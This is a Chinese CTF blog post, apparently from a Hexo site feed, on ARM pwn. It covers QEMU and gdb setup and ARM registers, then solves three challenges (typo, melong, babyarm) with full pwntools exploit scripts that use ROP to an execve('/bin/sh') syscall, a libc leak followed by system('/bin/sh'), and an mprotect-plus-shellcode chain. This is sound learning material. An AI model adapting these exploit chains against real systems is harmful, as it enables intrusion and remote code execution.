class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x13020a0&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x13020b0&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x13020c0&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x13020d0&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x13020e0&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x13020f0&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000020f11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>arm的环境搭建+简单的例题</title>
    <link href="http://yoursite.com/2020/02/07/arm%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E9%A2%98/"/>
    <id>http://yoursite.com/2020/02/07/arm的环境搭建-简单的例题/</id>
    <published>2020-02-07T14:54:19.000Z</published>
    <updated>2020-02-07T17:58:21.063Z</updated>
    
    <content type="html"><![CDATA[<p>关于arm的东西我好像已经拖了将近一个月了，不能再拖下去了，先记一些吧，之后我陆续补坑看看</p><h2 id="arm环境搭建"><a href="#arm环境搭建" class="headerlink" title="arm环境搭建"></a>arm环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装qemu</span><br><span class="line">apt-get install qemu</span><br><span class="line">#更新一下</span><br><span class="line">sudo apt-get update</span><br><span class="line">#安装32位的依赖库</span><br><span class="line">sudo apt-get install -y gcc-arm-linux-gnueabi</span><br><span class="line">#运行32位的动态链接程序方法</span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./文件</span><br><span class="line">#安装64位的依赖库</span><br><span class="line">sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu</span><br><span class="line">#运行64位的动态链接程序方法</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件</span><br><span class="line">#安装gdb调试工具</span><br><span class="line">sudo apt-get install git gdb gdb-multiarch</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="32位的调试步骤："><a href="#32位的调试步骤：" class="headerlink" title="32位的调试步骤："></a>32位的调试步骤：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#运行32位的动态链接程序方法</span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./文件</span><br><span class="line"></span><br><span class="line">#32位程序下断调试步骤</span><br><span class="line">1： qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./文件(窗口1)</span><br><span class="line">2： qemu-arm-static -g 1234 ./文件（窗口1）</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./文件(窗口2)</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">pwndbg&gt; b *0x8bb0</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure><h3 id="64位的调试步骤："><a href="#64位的调试步骤：" class="headerlink" title="64位的调试步骤："></a>64位的调试步骤：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#运行64位的动态链接程序方法</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件</span><br><span class="line">#64位程序下断调试步骤</span><br><span class="line">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./文件(窗口1)</span><br><span class="line">gdb-multiarch ./文件(窗口2)</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">pwndbg&gt; b *0x8bb0</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure><h3 id="起qemu的那个虚拟机"><a href="#起qemu的那个虚拟机" class="headerlink" title="起qemu的那个虚拟机"></a>起qemu的那个虚拟机</h3><p>（上面那些命令行好像更方便一点，这个的话可能每次打题都要起一次）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; -net nic,macaddr=52:54:00:12:34:56 -net tap -nographic</span><br></pre></td></tr></table></figure><h2 id="架构下的寄存器"><a href="#架构下的寄存器" class="headerlink" title="架构下的寄存器"></a>架构下的寄存器</h2><h3 id="64位的寄存器"><a href="#64位的寄存器" class="headerlink" title="64位的寄存器"></a>64位的寄存器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x0~x7：传递子程序的参数和返回值，使用时不需要保存，多余的参数用堆栈传递，64位的返回结果保存在x0中。</span><br><span class="line">x8：用于保存子程序的返回地址，使用时不需要保存。</span><br><span class="line">x9~x15：临时寄存器，也叫可变寄存器，子程序使用时不需要保存。</span><br><span class="line">x16~x17：子程序内部调用寄存器（IPx），使用时不需要保存，尽量不要使用。</span><br><span class="line">x18：平台寄存器，它的使用与平台相关，尽量不要使用。</span><br><span class="line">x19~x28：临时寄存器，子程序使用时必须保存。</span><br><span class="line">x29：帧指针寄存器（FP），用于连接栈帧，使用时必须保存。</span><br><span class="line">x30：链接寄存器（LR），用于保存子程序的返回地址。</span><br><span class="line">x31：堆栈指针寄存器（SP），用于指向每个函数的栈顶。</span><br></pre></td></tr></table></figure><h3 id="32位的寄存器"><a href="#32位的寄存器" class="headerlink" title="32位的寄存器"></a>32位的寄存器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r0-r3: 用于函数调用入参，32位最多支持4个入参，当多于4个入参是将通过压栈方式进行传递。栈的方式为先进后出，估参数大于4个时 入栈顺序与参数顺序正好相反，子程序返回前无需回复R0~R3的值,32位的返回结果保存在r0中。</span><br><span class="line">r4-r11: 用于保存局部变量。函数进入后首先第一件事就是将R4~R11入栈保存(看局部变量用了多少个，不一定所有都需要入栈)，然后才能用于本函数使用，本函数使用完之后，要将之前栈保存的数据恢复到R4~R11中</span><br><span class="line">r7: 系统调用时，存放系统调用号，有时也用于作为FP使用。FP又叫frame pointer即栈基指针，主要在函数中保存当前函数的栈起始位置，用于堆栈回溯。</span><br><span class="line">r13: SP，即栈指针寄存器，主要用于指向当前程序栈顶，配合指令pop/push等。</span><br><span class="line">r14: LR，即链接寄存器，主要用于存放函数的返回地址，即当前函数返回时，知道自己该回到哪儿去继续运行。</span><br><span class="line">r15: PC，即程序寄存器，主要用于存放CPU取指的地址。是取值地址，不是当前运行地址。</span><br></pre></td></tr></table></figure><p><img src="/2020/02/07/arm的环境搭建-简单的例题/1.png" alt></p><h2 id="arm的简单例题"><a href="#arm的简单例题" class="headerlink" title="arm的简单例题"></a>arm的简单例题</h2><h3 id="32位简单的arm"><a href="#32位简单的arm" class="headerlink" title="32位简单的arm"></a>32位简单的arm</h3><h4 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h4><p>就是道很简单的ret2text<br>用命令行先连上qume和gdb，让它跑起来</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/2.png" alt></p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/3.png" alt></p><p>然后就可以调了<br>我们在gdb里生成字符串，自己输的话，计算长度可能会出bug<br>调出长度之后就去找程序有没有system(‘/bin/sh’)<br>这个东西去了函数符号表，我不会那个rizzo的恢复，所以直接找字符’/bin/sh’</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/4.png" alt><br>会发现它在一个函数里<br>这个长得就很像execve，f5进去看一下</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/5.png" alt><br>然后这个名字就很像了，再加上系统调用号也出来了<br>（经大佬指点才知道arm32中系统调用号是在r7里的）<br>点开汇编，发现它确实是<br><img src="/2020/02/07/arm的环境搭建-简单的例题/6.png" alt><br>然后我们就用syscall来做这题吧<br>syscall要用的话，肯定是要r1、 r2的参数都得为null的<br>所以我们去找gadget<br><img src="/2020/02/07/arm的环境搭建-简单的例题/7.png" alt><br>r0的就只有一个，然后还有相关的r1和r7都能对应找到<br>唯独发现没有pop r2的gadget，所以我们考虑一下xor或者是mov（xor好像在arm里没有）<br><img src="/2020/02/07/arm的环境搭建-简单的例题/8.png" alt><br>这里面对r2有赋值为零的gadget，我们可以用一波，但事实它还自带三个pop，为了堆栈平衡，我们就还得填充三个0<br>差不多就可以写exp了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &quot;l&quot;:</span><br><span class="line">    io = process(&quot;./typo&quot;, timeout = 2)</span><br><span class="line">elif sys.argv[1] == &quot;d&quot;:</span><br><span class="line">    io = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;./typo&quot;])</span><br><span class="line">else:</span><br><span class="line">    io = remote(&quot;pwn2.jarvisoj.com&quot;, 9888, timeout = 2)</span><br><span class="line"></span><br><span class="line">mov_r2 = 0x0004df00 #mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;</span><br><span class="line">syscall = 0x0002165C</span><br><span class="line">pop_r3_r7 =0x0000a958</span><br><span class="line">pop_r0_r4 = 0x00020904 #pop &#123;r0, r4, pc&#125;</span><br><span class="line">pop_r1 = 0x00068bec</span><br><span class="line">pop_r7 = 0x00014068#0x00008160</span><br><span class="line">binsh = 0x0006c384</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*112 </span><br><span class="line">payload += p32(mov_r2)</span><br><span class="line">payload += p32(0)+p32(0)+p32(0)</span><br><span class="line">payload += p32(pop_r0_r4)</span><br><span class="line">payload += p32(binsh)+p32(0)</span><br><span class="line">payload += p32(pop_r7)+p32(0xb)</span><br><span class="line">payload += p32(pop_r1)+p32(0)</span><br><span class="line">payload += p32(syscall)</span><br><span class="line"># r0-&gt;binsh  r1,r2-&gt;0  arm的系统调用号存在r7</span><br><span class="line"># io.sendline(&apos;\n&apos;)</span><br><span class="line">io.sendlineafter(&quot;if you want to quit\n&quot;, &apos;\n&apos;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>然后我碰到一个很难受的bug，本地加了context.log_level = “debug”是能跑通的，但是不加就不行了，为啥呢，害，到时候再探究探究</p><h4 id="melong（arm32位）"><a href="#melong（arm32位）" class="headerlink" title="melong（arm32位）"></a>melong（arm32位）</h4><p>这题是个 简单的栈题，我被难倒的地方是offset到底是什么<br>这题的栈溢出存在于write那个函数里的read<br>用-1绕过len，使我们可以输入很多的东西，可以构造rop链<br><img src="/2020/02/07/arm的环境搭建-简单的例题/9.png" alt><br>write函数里面长这样，我们到出去看a2是什么<br><img src="/2020/02/07/arm的环境搭建-简单的例题/10.png" alt><br><img src="/2020/02/07/arm的环境搭建-简单的例题/11.png" alt><br>发现是v4，去找他的偏移，发现是0x54，就一般在我的印象里，偏移应该是ebp+0x54，所以应该再加一个4的，但是看了很多exp都是用的0x54</p><p>发现我们需要覆盖到dd4的地方 r11（d14-&gt;exid即下一个函数的地址存放处）而开始覆盖是在d80，offset为84 即 0x54（但是我并没有在ida里找到那段代码）<br><img src="/2020/02/07/arm的环境搭建-简单的例题/12.png" alt><br>这个是我写入100个字符之后，触发exit之后报错之后，计算出来的 偏移，就是0x54，这题也确实比较独特，ida里的偏移果然不一定是对的</p><p>然后用put的方法leak的话呢，本来以为会比较快捷方便一点，但是这里最想不到的是，进入了puts函数之后，结尾时会否存在pop，pc又在哪里赋值，在傻傻地用正常栈的方法试了一遍发现不行，选择跟进去看看puts里面的玄机</p><p>发现在末尾它有一个pop<br><img src="/2020/02/07/arm的环境搭建-简单的例题/13.png" alt><br>所以要想回到主函数还要填充些值进寄存器里</p><p>exp大概就如下了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line">import sys</span><br><span class="line">context.binary = &quot;./melong&quot;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &quot;r&quot;:</span><br><span class="line">    p = remote(&quot;localhost&quot;, 9999)</span><br><span class="line">elif sys.argv[1] == &quot;l&quot;:</span><br><span class="line">    p = process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;./melong&quot;])</span><br><span class="line">else:</span><br><span class="line">    p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;./melong&quot;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./melong&quot;, checksec = False)</span><br><span class="line">libc = ELF(&quot;./lib/libc.so.6&quot;, checksec = False)</span><br><span class="line"></span><br><span class="line">def check(height,weight):</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;1&quot;)</span><br><span class="line">p.sendlineafter(&quot;height(meters) :&quot;,str(height))</span><br><span class="line">p.sendlineafter(&quot;weight(kilograms) :&quot;,str(weight))</span><br><span class="line"></span><br><span class="line">def exercise():</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;2&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def register(num):</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;3&quot;)</span><br><span class="line">p.sendlineafter(&quot;training?&quot;,str(num))</span><br><span class="line"></span><br><span class="line">def write(content):</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;4&quot;)</span><br><span class="line"># p.sendlineafter(&apos;\n&apos;,content)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def out():</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;6&quot;)</span><br><span class="line"></span><br><span class="line">pop = 0x00011bbc</span><br><span class="line">check(1.58,49.8)</span><br><span class="line">register(-1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x54+p32(pop) + p32(elf.got[&apos;puts&apos;]) + p32(elf.sym[&apos;puts&apos;]) +p32(0)*7+p32(elf.sym[&apos;main&apos;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(payload)</span><br><span class="line">out()</span><br><span class="line">p.recvuntil(&quot;See you again :)\n&quot;)</span><br><span class="line"></span><br><span class="line">put_addr = u32(p.recvn(4))</span><br><span class="line">print hex(put_addr)</span><br><span class="line"></span><br><span class="line">libc.address = put_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line">print hex(libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">check(1.58,49.8)</span><br><span class="line">register(-1)</span><br><span class="line"></span><br><span class="line">pay = &quot;a&quot;*0x54 + p32(pop) + p32(next(libc.search(&quot;/bin/sh&quot;))) + p32(libc.sym[&apos;system&apos;])</span><br><span class="line"></span><br><span class="line">write(pay)</span><br><span class="line">out()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位简单题"><a href="#64位简单题" class="headerlink" title="64位简单题"></a>64位简单题</h3><h4 id="2018-上海大学生网络安全大赛-babyarm"><a href="#2018-上海大学生网络安全大赛-babyarm" class="headerlink" title="2018 上海大学生网络安全大赛 babyarm"></a>2018 上海大学生网络安全大赛 babyarm</h4><p>开了nx<br><img src="/2020/02/07/arm的环境搭建-简单的例题/14.png" alt></p><p>一眼看到了mprotect函数，一般呢有它就是改权限然后写shellcode了，上一次用这个好像是level5，emmmm碰巧这题好像也可以用这个方法做，听说是有三个参数的函数要调用和写参的话就用csu这种方法比较简单</p><p>我们知道这个题目有两层输入，第一层是不存在溢出的，第二处才存在，所以我们在第二处用csu的方法再调用回存储第一处输入的位置<br>所以我们找一下万能gadget</p><p>我们发现mprotect的几个参数传递过程如下</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/15.png" alt></p><p>mprotect是从0x411000开始的，题目中输入的地址为0x411068，所以可以让mprotect来改权限（这题好像和oj leve5不一样的是它不需要借助bss段了</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/16.png" alt></p><p>关于gadget的传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ret     跳转到 x30 寄存器，一般在函数的末尾会恢复函数的返回地址到 x30 寄存器</span><br><span class="line"></span><br><span class="line">ldp x19, x20, [sp, #0x10]     从 sp+0x10 的位置读 0x10 字节，按顺序放入 x19, x20 寄存器</span><br><span class="line"></span><br><span class="line">ldp x29, x30, [sp], #0x40      从 sp 的位置读 0x10 字节，按顺序放入 x29, x30 寄存器，然后 sp += 0x40</span><br><span class="line"></span><br><span class="line">MOV X1, X0  寄存器X0的值传给X1</span><br><span class="line"></span><br><span class="line">blr x3      跳转到由Xm目标寄存器指定的地址处，同时将下一条指令存放到X30寄存器中</span><br></pre></td></tr></table></figure><p>所以x29和x30会在x19和x20前面布置<br>x30是存放下一个执行的地址，相当于ebp吧<br>pc相当于rdi<br>所以我们布置rop：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*72 </span><br><span class="line">payload += p64(0x04008cc)</span><br><span class="line">payload += p64(0) #x29</span><br><span class="line">payload += p64(0x04008ac) #x30 ret-&gt;next pc</span><br><span class="line">payload += p64(0) #19</span><br><span class="line">payload += p64(0) #20</span><br><span class="line">payload += p64(bss) #21   mprotect_addr </span><br><span class="line">payload += p64(0x7) #22  x2</span><br><span class="line">payload += p64(0x1000) #23  x1</span><br><span class="line">payload += p64(0x411000) #24  x0</span><br><span class="line">payload += p64(0) #next x29</span><br><span class="line">payload += p64(bss+0x10) #next x30</span><br></pre></td></tr></table></figure><p>先布置完cc处的栈，然后跳回ac里执行mprotect，会再执行一遍cc，我们覆盖x30的内容为我们想它跳到的地址即可</p><p>完整的exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.binary = &quot;./pwn&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &quot;l&quot;:</span><br><span class="line">    p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])</span><br><span class="line">elif sys.argv[1] == &quot;d&quot;:</span><br><span class="line">    p = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;106.75.126.171&quot;, 33865)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = 0x00411068</span><br><span class="line">call_mprotect = 0x0400600</span><br><span class="line">shellcode = asm(shellcraft.execve(&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Name:&quot;)</span><br><span class="line">pay = p64(0x04007e0) #call_mprotect</span><br><span class="line">pay += p64(0)</span><br><span class="line">pay += shellcode   #must in addr+0x10</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*72 </span><br><span class="line">payload += p64(0x04008cc)</span><br><span class="line">payload += p64(0) #x29</span><br><span class="line">payload += p64(0x04008ac) #x30 ret-&gt;next pc</span><br><span class="line">payload += p64(0) #19</span><br><span class="line">payload += p64(0) #20</span><br><span class="line">payload += p64(bss) #21   mprotect  </span><br><span class="line">payload += p64(0x7) #22  x2</span><br><span class="line">payload += p64(0x1000) #23  x1</span><br><span class="line">payload += p64(0x411000) #24  x0</span><br><span class="line">payload += p64(0) #next x29?</span><br><span class="line">payload += p64(bss+0x10) #next x30</span><br><span class="line">sleep(0.5)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<br>        <a href="https://gdufs-king.github.io/2019/11/06/32%E4%BD%8D%E3%80%8164%E4%BD%8D%E4%B8%8B%E7%9A%84arm_pwn/" target="_blank" rel="noopener">V1ct0r师傅</a><br>        <a href="https://zszcr.github.io/2018/11/05/2018-11-5-%E3%80%90%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E3%80%91baby_arm%E5%A4%8D%E7%8E%B0/#more" target="_blank" rel="noopener">zs0zrc师傅</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于arm的东西我好像已经拖了将近一个月了，不能再拖下去了，先记一些吧，之后我陆续补坑看看&lt;/p&gt;
&lt;h2 id=&quot;arm环境搭建&quot;&gt;&lt;a href=&quot;#arm环境搭建&quot; class=&quot;headerlink&quot; title=&quot;arm环境搭建&quot;&gt;&lt;/a&gt;arm环境搭建&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#安装qemu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apt-get install qemu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#更新一下&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get update&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#安装32位的依赖库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install -y gcc-arm-linux-gnueabi&lt;/span&gt;&lt;br&gt;&lt;span 